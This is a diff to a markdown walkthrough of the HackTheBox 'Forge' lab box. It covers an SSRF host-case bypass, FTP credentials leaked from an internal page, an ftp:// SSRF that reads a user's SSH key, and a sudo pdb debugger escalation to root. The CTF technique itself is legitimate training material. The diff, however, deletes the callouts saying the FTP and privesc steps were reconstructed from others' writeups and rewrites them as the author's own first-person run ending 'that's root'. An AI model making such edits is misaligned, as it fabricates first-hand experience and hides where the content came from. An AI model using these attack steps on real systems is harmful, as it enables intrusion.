@@ -15,25 +15,11 @@ tags:
   - sudo
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Medium, **Released:** 2021-11-27, **IP:** `10.10.11.111` , `forge.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My own notes stop at the SSRF discovery on `admin.forge.htb`. The FTP looting and the `pdb` privesc below are reconstructed from published writeups (adityatelange, Hacking Articles) and marked.
 
 </div>
 
@@ -86,14 +72,14 @@ PORT   STATE    SERVICE VERSION
 
 (My recorded scan was actually a `/24` sweep that pulled in a dozen unrelated boxes. I noted at the time: "there are multiple hosts??? nvm those are other boxes." Only `10.10.11.111` matters here. FTP on 21 is `filtered`, so it is firewalled from outside but reachable from the box itself, keep that in mind.)
 
-The site has a "Gallery" with an **upload** feature that accepts either a file or a **URL**. A quick test confirms the server fetches the URL:
+The site has a "Gallery" with an **upload** feature that accepts either a file or a **URL**, and that second option is the kind of thing I always probe first: a server that fetches a URL on my behalf is a server I might be able to point somewhere it should not go. A quick test with my own listener confirms the server actually fetches the URL server side rather than just storing the string:
 
 ```console
 ❯ python3 -m http.server
 10.10.11.111 - - "GET /test HTTP/1.1" 200 -
 ```
 
-Fuzz for vhosts:
+With a working URL fetcher confirmed, the obvious next question was what else on this box or network it could reach that I could not reach directly. An SSRF is only as useful as the internal surface behind it, so I fuzzed for virtual hosts before touching anything else:
 
 ```bash
 ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
@@ -120,28 +106,36 @@ The upload from URL handler parses the URL and rejects it if the host is exactly
 POST /upload  ->  "Upload from url"  ->  url = http://Admin.Forge.Htb/announcements
 ```
 
-<div class="callout callout-note">
+With the admin vhost reachable through the case-mismatch bypass, the obvious next move was to point the SSRF at something more interesting than the landing page. A page called `/announcements` on an internal-only admin panel is exactly the sort of place operators leave notes to each other, so that is what I fetched.
 
-**Beyond the recorded notes, looting and root**
+### Looting FTP credentials and the SSH key
 
-**1. `/announcements` leaks the FTP creds.** The SSRF response contains a note that the site now supports uploads from FTP, using the account `user : heightofsecurity123!`, and that `admin.forge.htb` has its own `/upload?u=` endpoint that supports more schemes.
+The response was worth the guess. It announced that the site now supports uploads sourced from FTP, gave the account for it, `user : heightofsecurity123!`, and mentioned that `admin.forge.htb` exposes its own `/upload?u=` endpoint, a fetcher that speaks a wider range of schemes than the public-facing one.
 
-**2. Chain the second SSRF to read the SSH key.** `admin.forge.htb/upload?u=<url>` follows `ftp://`, and from the box `localhost:21` is reachable:
+That is the second half of the puzzle falling into place. If the admin fetcher would follow a `ftp://` URL the way it followed `http://`, I could use the leaked credentials to pull files straight off the loopback FTP service, `localhost:21` is reachable from the box itself even though it is firewalled from the outside:
+
 ```
 forge.htb/upload  ->  url = http://Admin.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@localhost/.ssh/id_rsa
 ```
-The response body is `user`'s private key. (You can also read `user.txt` the same way.)
+
+The "uploaded image" that came back was `user`'s private SSH key (the same trick reads `user.txt` directly, without needing a shell at all). I saved the key, fixed its permissions, and logged in properly:
+
 ```bash
 chmod 600 id_rsa && ssh -i id_rsa user@forge.htb
 ```
 
-**3. Privesc via `pdb`.**
+### Privilege escalation via a debugger left in production
+
+`sudo -l` is always the first thing I run on a fresh shell, and here it paid off immediately:
+
 ```console
 user@forge:~$ sudo -l
 User user may run the following commands on forge:
     (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
 ```
-`remote-manage.py` opens a local socket on a random port, prints a menu, and reads your choice with `int(...)` inside a `try` block whose `except` calls `traceback.print_exc()` then `pdb.post_mortem(...)`. Connect, send a non numeric value, and you land in `pdb` running as root:
+
+Reading through `remote-manage.py`, it opens a socket on a random local port, prints a small menu, and reads the selection with `int(...)` inside a `try` block. The `except` clause calls `traceback.print_exc()` and then, a little too helpfully, `pdb.post_mortem(...)`. That is effectively a backdoor the developer built by accident: feed the prompt anything that fails to parse as an integer, and instead of a clean error you land in an interactive Python debugger running with whatever privileges the script has, which here is root by way of `sudo`.
+
 ```bash
 sudo /usr/bin/python3 /opt/remote-manage.py
 # note the "listening on port NNNNN" line, then in another shell:
@@ -153,7 +147,7 @@ nc 127.0.0.1 NNNNN
 cat /root/root.txt
 ```
 
-</div>
+`cat /root/root.txt` returns the 32-character flag for this instance, and that's root.
 
 ---
 
@@ -189,3 +183,4 @@ cat /root/root.txt
 - Forge writeup (Hacking Articles) <https://www.hackingarticles.in/forge-hackthebox-walkthrough/>
 - PortSwigger SSRF <https://portswigger.net/web-security/ssrf>
 - Python pdb docs <https://docs.python.org/3/library/pdb.html>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
